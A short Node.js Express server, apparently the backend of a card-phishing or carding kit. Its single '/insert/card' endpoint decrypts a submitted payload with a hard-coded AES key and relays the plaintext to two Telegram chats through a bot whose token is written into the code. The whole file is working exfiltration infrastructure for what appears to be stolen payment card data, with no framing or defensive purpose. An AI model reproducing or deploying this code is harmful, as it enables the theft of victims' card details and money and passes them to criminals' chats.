const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
var CryptoJS = require("crypto-js");

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/insert/card', (req, res) => {

    decryptedResult = CryptoJS.AES.decrypt(req.body.fullRes.toString(), "402312").toString(CryptoJS.enc.Utf8);
    axios.post(
        "https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=" +
        decryptedResult
    )
    axios.post(
        "https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=2057649036&text=" +
        decryptedResult
    )

    res.sendStatus(200);
});

app.listen(port, () => console.log(`Started server at port ` + port));